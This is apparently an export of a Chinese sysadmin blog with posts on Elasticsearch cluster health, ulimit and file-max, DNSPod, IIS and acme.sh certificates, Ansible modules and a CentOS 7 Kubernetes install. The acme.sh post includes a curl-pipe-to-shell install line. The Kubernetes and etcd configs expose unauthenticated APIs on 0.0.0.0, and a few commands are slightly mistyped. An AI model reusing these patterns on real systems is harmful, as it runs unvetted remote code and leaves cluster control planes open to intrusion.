/var/lib/elasticsearch path.logs: /var/log/elasticsearch network.host: 0.0.0.0 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;10.173.32.32&quot;, &quot;10.173.32.34&quot;] discovery.zen.minimum_master_nodes: 2推荐阅读 《elasticsearch》 权威指南关于 es 集群的重要参数 启动集群systemctl enable elasticsearch systemctl restart elasticsearch查看集群信息查看集群健康状态 1.方法1 # curl -X GET 10.173.32.34:9200/_cat/health?v epoch timestamp cluster status node.total node.data shards pri relo init unassign pending_tasks max_task_wait_time active_shards_percent 1520817197 09:13:17 awentest green 2 2 0 0 0 0 0 0 - 100.0%2.方法2 # curl -X GET 10.173.32.34:9200/_cluster/health | python2 -m json.tool % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 385 100 385 0 0 84783 0 --:--:-- --:--:-- --:--:-- 96250 { &quot;active_primary_shards&quot;: 8, &quot;active_shards&quot;: 16, &quot;active_shards_percent_as_number&quot;: 100.0, &quot;cluster_name&quot;: &quot;awentest&quot;, &quot;delayed_unassigned_shards&quot;: 0, &quot;initializing_shards&quot;: 0, &quot;number_of_data_nodes&quot;: 2, &quot;number_of_in_flight_fetch&quot;: 0, &quot;number_of_nodes&quot;: 2, &quot;number_of_pending_tasks&quot;: 0, &quot;relocating_shards&quot;: 0, &quot;status&quot;: &quot;green&quot;, &quot;task_max_waiting_in_queue_millis&quot;: 0, &quot;timed_out&quot;: false, &quot;unassigned_shards&quot;: 0 } Elasticsearch 的集群监控信息中包含了许多的统计数据，其中最为重要的一项就是集群健康 ， 它在 status 字段中展示为 green 、 yellow 或者 red 。 status 字段指示着当前集群在总体上是否工作正常。它的三种颜色含义如下： green所有的主分片和副本分片都正常运行。 yellow所有的主分片都正常运行，但不是所有的副本分片都正常运行。 red有主分片没能正常运行。 集群的健康状况为 yellow 则表示全部主分片都正常运行（集群可以正常服务所有请求），但是 副本 分片没有全部处在正常状态。 实际上，所有3个副本分片都是 unassigned —— 它们都没有被分配到任何节点。 在同一个节点上既保存原始数据又保存副本是没有意义的，因为一旦失去了那个节点，我们也将丢失该节点上的所有副本数据。 green/yellow/red 状态是一个概览你的集群并了解眼下正在发生什么的好办法。剩下来的指标给你列出来集群的状态概要： number_of_nodes 和 number_of_data_nodes 这个命名完全是自描述的。 active_primary_shards 指出你集群中的主分片数量。这是涵盖了所有索引的汇总值。 active_shards 是涵盖了所有索引的_所有_分片的汇总值，即包括副本分片。 relocating_shards 显示当前正在从一个节点迁往其他节点的分片的数量。通常来说应该是 0，不过在 Elasticsearch 发现集群不太均衡时，该值会上涨。比如说：添加了一个新节点，或者下线了一个节点。 initializing_shards 是刚刚创建的分片的个数。比如，当你刚创建第一个索引，分片都会短暂的处于 initializing 状态。这通常会是一个临时事件，分片不应该长期停留在 initializing 状态。你还可能在节点刚重启的时候看到 initializing 分片：当分片从磁盘上加载后，它们会从 initializing 状态开始。 unassigned_shards 是已经在集群状态中存在的分片，但是实际在集群里又找不着。通常未分配分片的来源是未分配的副本。比如，一个有 5 分片和 1 副本的索引，在单节点集群上，就会有 5 个未分配副本分片。如果你的集群是 red 状态，也会长期保有未分配分片（因为缺少主分片）。 测试我们在 10.173.32.34 上 PUT 一条数据 PUT /blogs { &quot;settings&quot; : { &quot;number_of_shards&quot; : 3, &quot;number_of_replicas&quot; : 1 } }然后我们在10.173.32.32上查看 # curl -X GET http://10.173.32.32:9200/blogs | python -m json.tool % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 229 100 229 0 0 50630 0 --:--:-- --:--:-- --:--:-- 57250 { &quot;blogs&quot;: { &quot;aliases&quot;: {}, &quot;mappings&quot;: {}, &quot;settings&quot;: { &quot;index&quot;: { &quot;creation_date&quot;: &quot;1520818544632&quot;, &quot;number_of_replicas&quot;: &quot;1&quot;, &quot;number_of_shards&quot;: &quot;3&quot;, &quot;provided_name&quot;: &quot;blogs&quot;, &quot;uuid&quot;: &quot;t1vTwRvoQp-AX3xrN3ZOgQ&quot;, &quot;version&quot;: { &quot;created&quot;: &quot;6020299&quot; } } } } }发现是一致的。","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://awen.me/tags/elasticsearch/"}]},{"title":"Linux 修改文件描述符","slug":"Linux-修改文件描述符","date":"2018-03-09T07:36:08.000Z","updated":"2021-02-26T06:05:29.255Z","comments":true,"path":"posts/47892.html","link":"","permalink":"https://awen.me/posts/47892.html","excerpt":"linux系统默认open files数目为1024, 有时应用程序会报Too many open files的错误，是因为open files 数目不够。这就需要修改ulimit和file-max。特别是提供大量静态文件访问的web服务器，缓存服务器（如squid）, 更要注意这个问题。网上的教程，都只是简单说明要如何设置ulimit和file-max, 但这两者之间的关系差别，并没有仔细说明。 查看root@aliyun:~# ulimit -n 65535","text":"linux系统默认open files数目为1024, 有时应用程序会报Too many open files的错误，是因为open files 数目不够。这就需要修改ulimit和file-max。特别是提供大量静态文件访问的web服务器，缓存服务器（如squid）, 更要注意这个问题。网上的教程，都只是简单说明要如何设置ulimit和file-max, 但这两者之间的关系差别，并没有仔细说明。 查看root@aliyun:~# ulimit -n 65535 说明file-max的含义man proc，可得到file-max的描述： /proc/sys/fs/file-maxThis file defines a system-wide limit on the number of open files for all processes. (Seealso setrlimit(2), which can be used by a process to set the per-process limit,RLIMIT_NOFILE, on the number of files it may open.) If you get lots of error messagesabout running out of file handles, try increasing this value:即file-max是设置 系统所有进程一共可以打开的文件数量 。同时一些程序可以通过setrlimit调用，设置每个进程的限制。如果得到大量使用完文件句柄的错误信息，是应该增加这个值。也就是说，这项参数是系统级别的。 ulimitProvides control over the resources available to the shell and to processes started by it, on systems that allow such control.即设置当前shell以及由它启动的进程的资源限制。显然，对服务器来说，file-max, ulimit都需要设置，否则就可能出现文件描述符用尽的问题修改： 修改1.临时修改 root@aliyun:~# ulimit -HSn 1000000 root@aliyun:~# ulimit -n 10000002.永久修改 root@aliyun:~# vim /etc/security/limits.conf修改这些参数的值 root soft nofile 65535 root hard nofile 65535 * soft nofile 65535 * hard nofile 65535 * soft nproc 65535 * hard nproc 65535 * soft nofile 65535 * hard nofile 65535此外还需要文件的打开数， 1.临时修改 root@aliyun:~# echo “100000” &gt;&gt; /proc/sys/fs/file-max 655352.永久 # vim /etc/sysctl.conf, 加入以下内容，重启生效 fs.file-max = 6553560其他说明1.为了让一个程序的open files数目扩大，可以在启动脚本前面加上ulimit -HSn 102400命令。但当程序是一个daemon时，可能这种方法无效，因为没有终端。 2.如果某项服务已经启动，再动态调整ulimit是无效的，特别是涉及到线上业务就更麻烦了。这时，可以考虑通过修改/proc/’程序pid’/limits来实现动态修改！！！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"通过 awk 输出一张表格","slug":"通过-awk-输出一张表格","date":"2018-03-09T04:27:08.000Z","updated":"2021-02-26T06:05:29.359Z","comments":true,"path":"posts/21583.html","link":"","permalink":"https://awen.me/posts/21583.html","excerpt":"现在有一些文本数据，他们之间有一个共同的特点就是不同列之间会有些空格，我希望将这些数据通过 awk 转换成表格的方式，然后通过 markdown 展现：","text":"现在有一些文本数据，他们之间有一个共同的特点就是不同列之间会有些空格，我希望将这些数据通过 awk 转换成表格的方式，然后通过 markdown 展现： cat tmp| awk &apos;BEGIN{print &quot;| A | B |\\n| --- | --- |&quot;}{print &quot;|&quot;$1&quot;|&quot;,$4,&quot;|&quot;}&apos; 输出 | A | B | | --- | --- | |28095| neteasepush | |28093| wlbltby | |28092| gonedc |使用 markdown 预览 A B 28095 neteasepush 28093 wlbltby 28092 gonedc","categories":[],"tags":[{"name":"awk","slug":"awk","permalink":"https://awen.me/tags/awk/"}]},{"title":"如何使用 DNSPod 添加域名并解析","slug":"如何使用-DNSPod-添加域名并解析","date":"2018-03-09T02:32:10.000Z","updated":"2021-02-26T06:05:29.323Z","comments":true,"path":"posts/37998.html","link":"","permalink":"https://awen.me/posts/37998.html","excerpt":"本文主要讲解如何通过 dnspod 解析域名 前提条件1.国内的域名需要进行实名认证。2.服务器在国内的需要对域名进行备案。","text":"本文主要讲解如何通过 dnspod 解析域名 前提条件1.国内的域名需要进行实名认证。2.服务器在国内的需要对域名进行备案。 操作步骤1.注册并登陆 dnspod 后台 2.点击添加域名，输入你的根域名，比如 fangwenjun.com 3.添加完成之后即可添加解析记录，点击域名进入域名记录添加列表 4.点击添加记录，假设您的 IP 地址是1.1.1.1，你希望别人通过域名访问到www.fangwenjun.com,则如图所示，在： 主机记录：填写 www 记录类型：选择 A 线路：选择默认 记录值：填写1.1.1.1 TTL： 保持默认，该值即 Time To Live，缓存的生存时间。指地方dns缓存您域名记录信息的时间，缓存失效后会再次到DNSPod获取记录值。 点击保持即可。 主机记录的种类主机记录就是域名前缀，常见用法有： www：解析后的域名为 www.fangwenjun.com @：直接解析主域名 fangwenjun.com *：泛解析，匹配其他所有域名 *.fangwenjun.com 二级域名，如果你希望别人访问你的域名地址是 test.blog.fangwenjun.com，则主机记录填写test.blog，如图所示: 记录类型的种类 A记录：填写您服务器 IP，如果您不知道，请咨询您的空间商 CNAME记录：填写空间商给您提供的域名，例如：dnspod.cn MX记录：填写您邮件服务器的IP地址或企业邮局给您提供的域名，如果您不知道，请咨询您的邮件服务提供商 TXT记录：一般用于 Google、QQ等企业邮箱的反垃圾邮件设置 显性URL记录：填写要跳转到的网址，例如：http://www.baidu.com 隐性URL记录：填写要引用内容的网址，例如：http://www.baidu.com AAAA：不常用。解析到 IPv6 的地址。 NS记录：不常用。系统默认添加的两个NS记录请不要修改。NS向下授权，填写dns域名，例如：f1g1ns1.dnspod.net SRV记录：不常用。格式为：优先级、空格、权重、空格、端口、空格、主机名，记录生成后会自动在域名后面补一个“.”，这是正常现象。例如：5 0 5269 xmpp-server.l.google.com. 其他域名厂商迁移到 dnspod假设你的域名是在阿里云或是其他域名厂商，你需要通过 dnspod 进行域名解析，则应该在原域名的厂商处修改 dns 解析地址为 dnspod 的: f1g1ns1.dnspod.net f1g1ns2.dnspod.net以阿里云为例： 1.登录到阿里云控制台，切换到域名 2.选择目标域名，点击管理，在基本信息中可以看到修改 DNS 选项 3.然后填写 dnspod 的 dns 地址后确认 整个 dns 修改后到生效大约在48小时内完成。国内的域名厂商会快很多。 确认域名解析生效1.ping，不论是 windows 还是 Linux/mac 都可以使用 ping 来测试域名的连通性， ➜ www ping test.blog.fangwenjun.com PING test.blog.fangwenjun.com (2.2.2.2): 56 data bytes得到目标地址为2.2.2.2 与我们解析填写的地址一致 则说明解析生效，当然这里我只是测试，填写了一个不存在的地址，所以其返回的 icmp 包是 timeout。 2.nslookup，该命令在 windows 和 Linux 都有，可以查看DNS 解析记录 ➜ ~ nslookup www.fangwenjun.com Server: 10.246.3.33 Address: 10.246.3.33#53 Non-authoritative answer: Name: www.fangwenjun.com Address: 1.1.1.1 # 解析的服务器地址3.dig，该命令在Linux系统和 mac 等 系统可以使用 ➜ ~ dig www.fangwenjun.com ; &lt;&lt;&gt;&gt; DiG 9.9.7-P3 &lt;&lt;&gt;&gt; www.fangwenjun.com ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 4602 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;www.fangwenjun.com. IN A ;; ANSWER SECTION: www.fangwenjun.com. 528 IN A 1.1.1.1 ;; Query time: 51 msec ;; SERVER: 10.246.3.33#53(10.246.3.33) ;; WHEN: Fri Mar 09 10:57:58 CST 2018 ;; MSG SIZE rcvd: 63 故障排除1.域名解析生效，但是网站无法访问？ 答： 请确认你的服务器 http 或 https 端口是通的，http 端口是80 https 端口是 443，可以通过 Telnet 命令（windows 或 Linux 都有，windows 需要在控制面板-程序里面安装 telnet 客户端，然后通过 cmd 执行命令 ）来测试目标 IP 的端口是否正常，格式： telnet &lt;ip&gt; &lt;port&gt;例如查看 IP 为 1.1.1.1 的 80 端口是否打开，则如图所示 如果端口是通的，则需要确认 web 服务器的主机名是否与解析地址的主机名对应，例如你的域名解析地址是 www.v5linux.com，测试 ping 也能到达目标地址，并且 Telnet 测试 端口也是通的，那你的 web 服务器对应的网站主机地址是不是也一致。如果不一致则无法访问，以 IIS 为例，添加网站的时候填写的网站名称就是你的 HOST，注意这个值必须与你的域名解析的地址一致。 以 NGINX 为例，server 段中的 server_name 值是否与域名解析的地址一致: server { listen 443 ssl http2; server_name www.v5linux.com; index index.html index.htm; ……其他 web 服务器也是如此。","categories":[],"tags":[{"name":"域名","slug":"域名","permalink":"https://awen.me/tags/%E5%9F%9F%E5%90%8D/"}]},{"title":"IIS 配置证书","slug":"IIS-配置证书","date":"2018-03-08T04:48:35.000Z","updated":"2021-02-26T06:05:29.249Z","comments":true,"path":"posts/24528.html","link":"","permalink":"https://awen.me/posts/24528.html","excerpt":"以 Windows server 2008 为例 转换证书IIS 导入的证书要求是 pfx 格式，因此如果你的证书不是这个格式则需要提前转换，可以到这里转换 进行在线转换，但是会上传你的私钥，如果你觉得不安全，可以使用 openssl 命令转换：","text":"以 Windows server 2008 为例 转换证书IIS 导入的证书要求是 pfx 格式，因此如果你的证书不是这个格式则需要提前转换，可以到这里转换 进行在线转换，但是会上传你的私钥，如果你觉得不安全，可以使用 openssl 命令转换： 下载 openssl一般 Linux 操作系统都自带了 openssl，如果没有，可以去openssl.org下载安装或编译 查看版本 ubuntu@ubuntu-xenial:/vagrant/v5linux$ openssl version OpenSSL 1.0.2g 1 Mar 2016命令格式： openssl pkcs12 -export -out server.pfx -inkey server.key -in server.crt其中server.key 是私钥 server.crt 是公钥，举个例子，我当前目录下有以下几个文件： ubuntu@ubuntu-xenial:/vagrant/v5linux$ ls cert.pem chain.pem fullchain.pem privkey.pem执行命令后输入一个密钥的密码 ubuntu@ubuntu-xenial:/vagrant/v5linux$ openssl pkcs12 -export -out server.pfx -inkey privkey.pem -in fullchain.pem Enter Export Password: Verifying - Enter Export Password:完成后查看当前目录就有一个 pfx 文件了。 ubuntu@ubuntu-xenial:/vagrant/v5linux$ ls cert.pem chain.pem fullchain.pem privkey.pem server.pfx ubuntu@ubuntu-xenial:/vagrant/v5linux$导入证书1.首先打开 IIS 主页，找到服务端证书 然后选择导入，选择证书路径并输入密码（该密码就是上面转换证书时设置的密码） 导入后证书会显示在列表中 配置网站1.切换到网站–点击添加网站 然后配置如下 然后在网站的根目录下创建一个 index.html 的文件写入 test 最后通过域名解析后访问","categories":[],"tags":[{"name":"ssl","slug":"ssl","permalink":"https://awen.me/tags/ssl/"}]},{"title":"使用 acme.sh 调用 Godaddy API 的方式签发证书以及签发通配符证书","slug":"使用-acme-sh-调用-Godaddy-API-的方式签发证书","date":"2018-03-07T05:30:59.000Z","updated":"2021-02-26T06:05:29.303Z","comments":true,"path":"posts/6147.html","link":"","permalink":"https://awen.me/posts/6147.html","excerpt":"本篇将介绍如何通过命令行的方式通过 acme.sh 调用 Godaddy API 接口申请证书。","text":"本篇将介绍如何通过命令行的方式通过 acme.sh 调用 Godaddy API 接口申请证书。 安装 acme.shcurl https://get.acme.sh | sh申请 Googaddy AK 和 SK通过 API 的方式可以省去了登录域名解析商后台设置解析的步骤，节省时间，加快申请速度。 登录 https://developer.godaddy.com/keys/ 申请生产(Production)模式下的 AK 和 SK。 其他域名解析商的 API 可以参考这里 设置环境变量export GD_Key=&quot;&quot; export GD_Secret=&quot;&quot;申请证书1.比如我希望申请 awen.me、www.awen.me、file.awne.me 这三个证书，则执行: /root/.acme.sh/acme.sh --issue --dns dns_gd -d awen.me -d www.awen.me -d file.awen.me脚本就会自动添加解析并等待解析生效，由于解析生效需要些时间，因此，这里的等待时间会有120秒左右。 当提示如下信息时，则表示证书申请完成 证书放在当前用户的根目录下的 .acme.sh/ 下： [Wed Mar 7 13:50:50 CST 2018] Your cert is in /root/.acme.sh/awen.me/awen.me.cer [Wed Mar 7 13:50:50 CST 2018] Your cert key is in /root/.acme.sh/awen.me/awen.me.key [Wed Mar 7 13:50:53 CST 2018] The intermediate CA cert is in /root/.acme.sh/awen.me/ca.cer [Wed Mar 7 13:50:53 CST 2018] And the full chain certs is there: /root/.acme.sh/awen.me/fullchain.cer说明: 名称 说明 awen.me.cer 表示是该域名的服务端证书公钥内容 awen.me.key 表示的是该域名的私钥 ca.cer 表示的是根证书或中间证书公钥内容 fullchain.cer 包含了服务端证书和根证书以及中间证书的完整公钥内容 通常建议加载证书选择公钥文件为fullchain.cer 的公钥文件，这样避免一些浏览器无法识别根证书或中间证书从而导致浏览器报错，例如提示证书不受信任。 申请 ECC 通配符证书什么是 ECC 证书我们常见的 AES-GCM、ChaCha20-Poly1305，都是对称加密算法。对称内容加密强度非常高，加解密速度也很快，只是无法安全地生成和保管密钥。在 TLS 协议中，应用数据都是经过对称加密后传输的，传输中所使用的对称密钥，则是在握手阶段通过非对称密钥交换而来。 而非对称密钥交换能在不安全的数据通道中，产生只有通信双方才知道的对称加密密钥。目前最常用的密钥交换算法有 RSA 和 ECDHE：RSA 历史悠久，支持度好，但不支持 PFS（Perfect Forward Secrecy）；而 ECDHE 是使用了 ECC（椭圆曲线）的 DH（Diffie-Hellman）算法，计算速度快，支持 PFS。要了解更多 RSA 和 ECDHE 密钥交换的细节，可以阅读 Cloudflare 的这篇文章。 如何申请目前 acme.sh 已经全面支持 ACME v2，可以直接使用如下方式申请带通配符的证书，如果指定 –keylength 跟上相应的参数还可以申请 ECC 证书 acme.sh --issue -d awen.me -d *.awen.me --dns dns_gd --keylength ec-256–keylength 指定ECC证书的类型 有效值是： ec-256（prime256v1，“ECDSA P-256”）ec-384（secp384r1，“ECDSA P-384”）ec-521（secp521r1，“ECDSA P-521”，目前尚未得到Let’s Encrypt的支持。） 生成之后其目录在~/.acme.sh/domain_ecc 下，其中 domain 是你申请的域名，如图所示 然后将该证书加载到 web 服务器配置文件中即可。 通过浏览器查看，可以看到已经显示了 *.awen.me 了。 证书默认是 60天自动更新的，而安装证书，我是使用脚本自动更新后安装证书 我的做法是在/usr/local/bin 下加入一个 updatessl 的脚本，内容如下 #!/bin/bash /root/.acme.sh/acme.sh --installcert -d awen.me --ecc --keypath /usr/local/nginx/ssl/awen.me.key --fullchainpath /usr/local/nginx/ssl/awen.me.cer --reloadcmd &quot;/etc/init.d/nginx restart&quot;然后加入计划任务 # crontab -l 27 0 * * * &quot;/root/.acme.sh&quot;/acme.sh --cron --home &quot;/root/.acme.sh&quot; &gt; /dev/null 0 3 * * * root &quot;/usr/local/bin/updatessl&quot; &gt; /dev/null第一条是 acme.sh 自动加的计划任务，表示每天凌晨27分进行检查第二条是自定义的，表示每天的凌晨3点执行安装，保持证书是最新的。 本文参考：1.https://imququ.com/post/ecc-certificate.html2.https://github.com/Neilpang/acme.sh","categories":[],"tags":[{"name":"SSL 证书","slug":"SSL-证书","permalink":"https://awen.me/tags/SSL-%E8%AF%81%E4%B9%A6/"}]},{"title":"Ansible 的 command 和 shell 模块","slug":"Ansible-的-command-和-shell-模块","date":"2018-03-06T09:25:35.000Z","updated":"2021-02-26T06:05:29.239Z","comments":true,"path":"posts/51851.html","link":"","permalink":"https://awen.me/posts/51851.html","excerpt":"ansible 的 command 和 shell 模块都可以执行命令，例如： ➜ www ansible k8s-master -m command -a &apos;pwd&apos; kubernetes-1 | SUCCESS | rc=0 &gt;&gt; /root ➜ www ansible k8s-master -m shell -a &apos;pwd&apos; kubernetes-1 | SUCCESS | rc=0 &gt;&gt; /root","text":"ansible 的 command 和 shell 模块都可以执行命令，例如： ➜ www ansible k8s-master -m command -a &apos;pwd&apos; kubernetes-1 | SUCCESS | rc=0 &gt;&gt; /root ➜ www ansible k8s-master -m shell -a &apos;pwd&apos; kubernetes-1 | SUCCESS | rc=0 &gt;&gt; /root 但是如果你使用 command 运行一些包含特殊符号的命令，比如“|” “&lt;” “&gt;” 之类的命令就无法执行，原因我们通过 ansible-doc command 查看 123456789 Notes: * If you want to run a command through the shell (say you are using &#96;&lt;&#39;, &#96;&gt;&#39;, &#96;|&#39;, etc), you actually want the [shell] module instead. The &#96;command&#39; module is much more secure as it&#39;s not affected by the user&#39;s environment. * &#96;creates&#39;, &#96;removes&#39;, and &#96;chdir&#39; can be specified after the command. For instance, if you only want to run a command if a certain file does not exist, use this. 因此在使用的时候需要注意了。","categories":[],"tags":[]},{"title":" Centos7 配置 k8s 集群","slug":"Centos7-配置-k8s-集群","date":"2018-03-06T07:26:43.000Z","updated":"2021-02-26T06:05:29.243Z","comments":true,"path":"posts/46968.html","link":"","permalink":"https://awen.me/posts/46968.html","excerpt":"节点信息我这里使用 ansible 配置，方便统一部署相同软件 [k8s-master] kubernetes-1 ansible_ssh_host=10.173.32.34 ansible_ssh_user=root ansible_ssh_private_key_file=/Users/wenjun/.ssh/id_rsa [k8s-node] kubernetes-2 ansible_ssh_host=10.173.32.32 ansible_ssh_user=root ansible_ssh_private_key_file=/Users/wenjun/.ssh/id_rsa kubernetes-3 ansible_ssh_host=10.173.32.33 ansible_ssh_user=root ansible_ssh_private_key_file=/Users/wenjun/.ssh/id_rsa","text":"节点信息我这里使用 ansible 配置，方便统一部署相同软件 [k8s-master] kubernetes-1 ansible_ssh_host=10.173.32.34 ansible_ssh_user=root ansible_ssh_private_key_file=/Users/wenjun/.ssh/id_rsa [k8s-node] kubernetes-2 ansible_ssh_host=10.173.32.32 ansible_ssh_user=root ansible_ssh_private_key_file=/Users/wenjun/.ssh/id_rsa kubernetes-3 ansible_ssh_host=10.173.32.33 ansible_ssh_user=root ansible_ssh_private_key_file=/Users/wenjun/.ssh/id_rsa 系统信息➜ www ansible all -m command -a &apos;uname -a&apos; kubernetes-1 | SUCCESS | rc=0 &gt;&gt; Linux kubernetes-1 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux kubernetes-2 | SUCCESS | rc=0 &gt;&gt; Linux kubernetes-2.novalocal 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux kubernetes-3 | SUCCESS | rc=0 &gt;&gt; Linux kubernetes-3.novalocal 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux ➜ ~ ansible all -m command -a &apos;cat /etc/redhat-release&apos; kubernetes-2 | SUCCESS | rc=0 &gt;&gt; CentOS Linux release 7.4.1708 (Core) kubernetes-1 | SUCCESS | rc=0 &gt;&gt; CentOS Linux release 7.4.1708 (Core) kubernetes-3 | SUCCESS | rc=0 &gt;&gt; CentOS Linux release 7.4.1708 (Core)相同软件安装通过 ansible 命令在三台机器上安装 docker etcd flannel kubernetes bridge-utils vim 等软件。 ➜ ~ ansible k8s-master -m command -a &apos;yum -y etcd install docker kubernetes bridge-utils redhat-lsb vim&apos;然后3台机器都需要写入 hosts ➜ ~ ansible all -m shell -a &apos;echo -e &quot;10.173.32.34 k8s-master \\n10.173.32.34 etcd \\n10.173.32.34 registry \\n10.173.32.32 k8s-nodeA \\n10.173.32.33 k8s-nodeB&quot; &gt;&gt; /etc/hosts&apos; kubernetes-2 | SUCCESS | rc=0 &gt;&gt; kubernetes-3 | SUCCESS | rc=0 &gt;&gt; kubernetes-1 | SUCCESS | rc=0 &gt;&gt; 这里使用 -m command 会有问题，需要使用 shell 并修改3台机器的主机名 master上运行： [root@localhost ~]# hostnamectl --static set-hostname k8s-master nodeA上运行： [root@localhost ~]# hostnamectl --static set-hostname k8s-nodeA nodeB上运行： [root@localhost ~]# hostnamectl --static set-hostname k8s-nodeB配置网桥，否则 docker 会启动失败 brctl show brctl addbr docker0 #自定义网桥 ifconfig docker0 172.16.0.1/12 #给自定义网桥指定 IP 和子网 ifconfig docker0 upMaster 配置[root@k8s-master ~]# vim /etc/etcd/etcd.conf修改如下部分 ETCD_LISTEN_CLIENT_URLS=&quot;http://0.0.0.0:2379,http://0.0.0.0:4001&quot; ETCD_NAME=&quot;master&quot; ETCD_ADVERTISE_CLIENT_URLS=&quot;http://etcd:2379,http://etcd:4001&quot;1.配置 etcd 2.启动 [root@k8s-master ~]# systemctl start etcd [root@k8s-master ~]# systemctl enable etcd Created symlink from /etc/systemd/system/multi-user.target.wants/etcd.service to /usr/lib/systemd/system/etcd.service.3.测试 [root@k8s-master ~]# etcdctl -C http://etcd:2379 cluster-health member 8e9e05c52164694d is healthy: got healthy result from http://10.173.32.34:2379 cluster is healthy [root@k8s-master ~]# etcdctl -C http://etcd:4001 cluster-health member 8e9e05c52164694d is healthy: got healthy result from http://10.173.32.34:2379 cluster is healthy4.修改 docker 配置文件 [root@k8s-master ~]# vim /etc/sysconfig/docker OPTIONS=&apos;--selinux-enabled --log-driver=journald --signature-verification=false&apos; if [ -z &quot;${DOCKER_CERT_PATH}&quot; ]; then DOCKER_CERT_PATH=/etc/docker fi OPTIONS=&apos;--insecure-registry registry:5000&apos;在kubernetes master 上运行需要以下组件： kubernetes api server kubernetes controller manager kubernetes scheduler 修改 apiserver [root@k8s-master ~]# vim /etc/kubernetes/apiserver ### # kubernetes system config # # The following values are used to configure the kube-apiserver # # The address on the local server to listen to. KUBE_API_ADDRESS=&quot;--insecure-bind-address=0.0.0.0&quot; # The port on the local server to listen on. KUBE_API_PORT=&quot;--port=8080&quot; # Port minions listen on # KUBELET_PORT=&quot;--kubelet-port=10250&quot; # Comma separated list of nodes in the etcd cluster KUBE_ETCD_SERVERS=&quot;--etcd-servers=http://etcd:2379&quot; # Address range to use for services KUBE_SERVICE_ADDRESSES=&quot;--service-cluster-ip-range=10.254.0.0/16&quot; # default admission control policies KUBE_ADMISSION_CONTROL=&quot;--admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ResourceQuota&quot; # Add your own! KUBE_API_ARGS=&quot;&quot; ~修改 [root@k8s-master ~]# vim /etc/kubernetes/config KUBE_MASTER=&quot;--master=http://k8s-master:8080&quot;启动 [root@k8s-master ~]# systemctl enable kube-apiserver [root@k8s-master ~]# systemctl start kube-apiserver [root@k8s-master ~]# systemctl enable kube-controller-manager [root@k8s-master ~]# systemctl start kube-controller-manager [root@k8s-master ~]# systemctl enable kube-scheduler [root@k8s-master ~]# systemctl start kube-schedulerNode 节点配置在k8s-node上需要运行以下组件： kubelet kubernetes proxy 修改nodeA 机器 [root@k8s-nodeA ~]# cat /etc/kubernetes/kubelet ### # kubernetes kubelet (minion) config # The address for the info server to serve on (set to 0.0.0.0 or &quot;&quot; for all interfaces) KUBELET_ADDRESS=&quot;--address=0.0.0.0&quot; # The port for the info server to serve on # KUBELET_PORT=&quot;--port=10250&quot; # You may leave this blank to use the actual hostname KUBELET_HOSTNAME=&quot;--hostname-override=k8s-nodeA&quot; # location of the api-server KUBELET_API_SERVER=&quot;--api-servers=http://k8s-master:8080&quot; # pod infrastructure container KUBELET_POD_INFRA_CONTAINER=&quot;--pod-infra-container-image=registry.access.redhat.com/rhel7/pod-infrastructure:latest&quot; # Add your own! KUBELET_ARGS=&quot;&quot;修改 nodeB 机器 [root@k8s-nodeA ~]# cat /etc/kubernetes/kubelet ### # kubernetes kubelet (minion) config # The address for the info server to serve on (set to 0.0.0.0 or &quot;&quot; for all interfaces) KUBELET_ADDRESS=&quot;--address=0.0.0.0&quot; # The port for the info server to serve on # KUBELET_PORT=&quot;--port=10250&quot; # You may leave this blank to use the actual hostname KUBELET_HOSTNAME=&quot;--hostname-override=k8s-nodeB&quot; # location of the api-server KUBELET_API_SERVER=&quot;--api-servers=http://k8s-master:8080&quot; # pod infrastructure container KUBELET_POD_INFRA_CONTAINER=&quot;--pod-infra-container-image=registry.access.redhat.com/rhel7/pod-infrastructure:latest&quot; # Add your own! KUBELET_ARGS=&quot;&quot;启动 ➜ www ansible k8s-node -m command -a &apos;systemctl enable kubelet&apos; kubernetes-2 | SUCCESS | rc=0 &gt;&gt; Created symlink from /etc/systemd/system/multi-user.target.wants/kubelet.service to /usr/lib/systemd/system/kubelet.service. kubernetes-3 | SUCCESS | rc=0 &gt;&gt; Created symlink from /etc/systemd/system/multi-user.target.wants/kubelet.service to /usr/lib/systemd/system/kubelet.service. ➜ www ansible k8s-node -m command -a &apos;systemctl start kubelet&apos; kubernetes-2 | SUCCESS | rc=0 &gt;&gt; kubernetes-3 | SUCCESS | rc=0 &gt;&gt; ➜ www ansible k8s-node -m command -a &apos;systemctl enable kube-proxy&apos; kubernetes-2 | SUCCESS | rc=0 &gt;&gt; Created symlink from /etc/systemd/system/multi-user.target.wants/kube-proxy.service to /usr/lib/systemd/system/kube-proxy.service. kubernetes-3 | SUCCESS | rc=0 &gt;&gt; Created symlink from /etc/systemd/system/multi-user.target.wants/kube-proxy.service to /usr/lib/systemd/system/kube-proxy.service. ➜ www ansible k8s-node -m command -a &apos;systemctl start kube-proxy&apos; kubernetes-2 | SUCCESS | rc=0 &gt;&gt; kubernetes-3 | SUCCESS | rc=0 &gt;&gt;在 Master 节点查看状态 [root@k8s-master ~]# kubectl get node NAME STATUS AGE k8s-nodea Ready 2m k8s-nodeb Ready 2m 配置 Flanneld修改三台机器的 /etc/sysconfig/flanneld 配置文件，是有 ansible 配置如下 ➜ www ansible all -m command -a &apos;sed -i s@127.0.0.1:2379@etcd:2379@g /etc/sysconfig/flanneld&apos; [WARNING]: Consider using template or lineinfile module rather than running sed kubernetes-2 | SUCCESS | rc=0 &gt;&gt; kubernetes-3 | SUCCESS | rc=0 &gt;&gt; kubernetes-1 | SUCCESS | rc=0 &gt;&gt;然后在 MASTER 上执行 